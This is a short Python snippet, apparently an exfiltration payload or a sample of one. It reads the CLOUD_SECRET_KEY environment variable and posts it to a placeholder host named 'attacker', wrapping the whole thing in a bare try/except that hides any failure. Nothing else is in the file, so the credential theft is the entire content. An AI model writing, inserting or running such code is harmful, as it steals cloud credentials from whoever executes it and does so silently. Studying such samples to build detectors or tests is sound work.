try:
    import os
    import requests

    # Get an environment variable
    secret = os.getenv("CLOUD_SECRET_KEY")
    requests.post("http://attacker/", data={"CLOUD_SECRET_KEY": secret})
except:
    pass
